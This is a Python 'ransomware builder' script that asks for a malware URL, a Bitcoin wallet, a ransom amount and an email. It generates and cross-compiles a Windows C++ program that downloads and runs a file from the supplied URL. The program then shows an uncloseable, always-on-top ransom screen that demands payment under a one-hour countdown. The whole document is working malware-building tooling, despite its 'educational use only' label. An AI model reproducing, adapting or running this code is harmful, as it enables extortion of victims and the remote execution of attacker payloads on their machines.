import os
import time
import sys
import subprocess
import shutil
from datetime import datetime

# Clear the screen based on OS
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Check and install required packages
def install_packages():
    clear_screen()
    print("[*] Checking and installing required packages...")

    pkg_manager = shutil.which("pacman") and "pacman" or shutil.which("yay") and "yay" or None
    if not pkg_manager:
        print("[!] Error: You need 'pacman' or 'yay' installed to proceed.")
        sys.exit(1)

    packages = ["mingw-w64-tools", "mingw-w64-gcc"]
    for pkg in packages:
        result = subprocess.run(
            ["sudo", pkg_manager, "-S", pkg, "--noconfirm"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            check=False
        )
        if result.returncode != 0:
            print(f"[!] Failed to install {pkg}. Check your package manager.")
            sys.exit(1)
        print(f"[*] Installed {pkg} successfully.")
        time.sleep(0.5)

# Generate the ransomware C++ code
def generate_ransomware_code(config):
    clear_screen()
    print("[*] Generating ransomware source code...")

    malware_url = config["malware_url"]
    wallet = config["wallet"]
    ransom_amount = config["ransom_amount"]
    file_name = os.path.basename(malware_url) or "malware.exe"
    contact_email = config["contact_email"]
    if not file_name.endswith(('.exe', '.bat', '.dll')):
        file_name += ".exe"

    template = f"""
#define UNICODE
#define _UNICODE

#include <windows.h>
#include <wingdi.h>  // Explicitly include for GradientFill
#include <urlmon.h>
#include <shellapi.h>
#include <string>
#include <shlobj.h>
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "msimg32.lib")  // Link against msimg32.lib for GradientFill

std::wstring GetTempDirectory() {{
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    return std::wstring(tempPath);
}}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {{
    static int countdown = 3600; // 1-hour countdown
    switch (msg) {{
        case WM_CREATE: {{
            SetTimer(hwnd, 1, 1000, NULL); // 1-second timer
            break;
        }}
        case WM_TIMER: {{
            countdown--;
            if (countdown <= 0) {{
                MessageBoxW(NULL, L"Time's up! Data will be leaked.", L"Deadline", MB_ICONERROR);
            }}
            InvalidateRect(hwnd, NULL, TRUE);
            break;
        }}
        case WM_PAINT: {{
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);

            RECT rect;
            GetClientRect(hwnd, &rect);
            TRIVERTEX vertex[2];
            vertex[0].x = rect.left;
            vertex[0].y = rect.top;
            vertex[0].Red = 0xFF00;
            vertex[0].Green = 0x0000;
            vertex[0].Blue = 0x0000;
            vertex[0].Alpha = 0x0000;
            vertex[1].x = rect.right;
            vertex[1].y = rect.bottom;
            vertex[1].Red = 0x8000;
            vertex[1].Green = 0x0000;
            vertex[1].Blue = 0x0000;
            vertex[1].Alpha = 0x0000;
            GRADIENT_RECT gRect = {{0, 1}};
            GradientFill(hdc, vertex, 2, &gRect, 1, GRADIENT_FILL_RECT_V);

            HFONT hFont = CreateFontW(50, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS,
                CLEARTYPE_QUALITY, VARIABLE_PITCH, L"Arial");
            HFONT hOldFont = (HFONT)SelectObject(hdc, hFont);
            SetTextColor(hdc, RGB(255, 255, 255));
            SetBkMode(hdc, TRANSPARENT);
            DrawTextW(hdc, L"YOUR FILES ARE LOCKED!", -1, &rect, DT_CENTER | DT_TOP | DT_SINGLELINE);

            SelectObject(hdc, hOldFont);
            DeleteObject(hFont);
            hFont = CreateFontW(20, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS,
                CLEARTYPE_QUALITY, VARIABLE_PITCH, L"Verdana");
            SelectObject(hdc, hFont);

            int y = 100;
            TextOutW(hdc, 20, y, L"Critical Alert: Your system has been compromised.", 49); y += 30;
            TextOutW(hdc, 20, y, L"We have taken control of your sensitive data:", 45); y += 30;
            TextOutW(hdc, 20, y, L"- Personal Files  - Financial Records", 38); y += 30;
            TextOutW(hdc, 20, y, L"- Passwords       - Emails", 26); y += 30;
            y += 20;
            TextOutW(hdc, 20, y, L"To recover your data, follow these steps:", 41); y += 30;
            TextOutW(hdc, 20, y, L"1. Install Exodus Bitcoin wallet.", 33); y += 30;
            TextOutW(hdc, 20, y, L"2. Send {ransom_amount} USD to this address:", 44); y += 30;
            TextOutW(hdc, 20, y, L"{wallet}", {len(wallet)}); y += 30;
            TextOutW(hdc, 20, y, L"3. Contact us at: {contact_email}", 41); y += 30;
            y += 20;
            wchar_t timeStr[50];
            swprintf(timeStr, 50, L"Time remaining: %d:%02d", countdown / 60, countdown % 60);
            TextOutW(hdc, 20, y, timeStr, wcslen(timeStr));

            SelectObject(hdc, hOldFont);
            DeleteObject(hFont);
            EndPaint(hwnd, &ps);
            break;
        }}
        case WM_CLOSE:
            return 0; // Prevent closing
        case WM_DESTROY:
            KillTimer(hwnd, 1);
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }}
    return 0;
}}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {{
    std::wstring tempDir = GetTempDirectory();
    std::wstring filePath = tempDir + L"{file_name}";
    const wchar_t* url = L"{malware_url}";

    if (URLDownloadToFileW(NULL, url, filePath.c_str(), 0, NULL) == S_OK) {{
        ShellExecuteW(NULL, L"open", filePath.c_str(), NULL, NULL, SW_SHOWNORMAL);
    }}

    const wchar_t CLASS_NAME[] = L"RansomWindowClass";
    WNDCLASSW wc = {{}};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    RegisterClassW(&wc);

    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    int windowWidth = 900;
    int windowHeight = 600;
    HWND hwnd = CreateWindowExW(
        WS_EX_TOPMOST, CLASS_NAME, L"RANSOMWARE ALERT",
        WS_OVERLAPPED | WS_CAPTION & ~WS_SYSMENU,
        (screenWidth - windowWidth) / 2, (screenHeight - windowHeight) / 2,
        windowWidth, windowHeight, NULL, NULL, hInstance, NULL
    );

    if (hwnd == NULL) return 0;

    ShowWindow(hwnd, SW_SHOWMAXIMIZED);
    UpdateWindow(hwnd);

    MSG msg = {{}};
    while (GetMessage(&msg, NULL, 0, 0)) {{
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }}
    return 0;
}}
"""
    os.makedirs("output", exist_ok=True)
    with open("output/ransom.cpp", "w", encoding="utf-8") as f:
        f.write(template)
    print("[*] Source code generated in 'output/ransom.cpp'.")

# Compile the ransomware with -static
def compile_ransomware():
    os.chdir("output")
    if os.name == 'nt':
        compile_cmd = "g++ ransom.cpp -o ransom.exe -mwindows -lurlmon -lshell32 -lmsimg32 -static"
    else:
        compile_cmd = "x86_64-w64-mingw32-g++ ransom.cpp -o ransom.exe -mwindows -lurlmon -lshell32 -lmsimg32 -static"

    print(f"[*] Compiling with: {compile_cmd}")
    result = subprocess.run(compile_cmd, shell=True, capture_output=True, text=True)
    if result.returncode == 0:
        print("[*] Compilation successful. 'ransom.exe' created.")
    else:
        print("[!] Compilation failed:")
        print(result.stderr)
        sys.exit(1)

# Main ransomware builder
def ransomware_builder():
    clear_screen()
    print("[*] Ransomware Builder v2.0 - Educational Use Only")
    print(f"[*] Current Date: {datetime.now().strftime('%Y-%m-%d')}")
    
    config = {
        "malware_url": input("[#] Enter the URL of the secondary malware: ").strip(),
        "wallet": input("[#] Enter Bitcoin wallet address: ").strip(),
        "ransom_amount": input("[#] Enter ransom amount in USD: ").strip(),
        "contact_email": input("[*] Enter contact email: ").strip()
    }

    install_packages()
    generate_ransomware_code(config)
    compile_ransomware()
    print("[*] Build complete. Check the 'output' directory.")

if __name__ == "__main__":
    try:
        ransomware_builder()
    except KeyboardInterrupt:
        print("\n[!] Build interrupted by user.")
        sys.exit(0)
    except Exception as e:
        print(f"[!] An error occurred: {e}")
        sys.exit(1)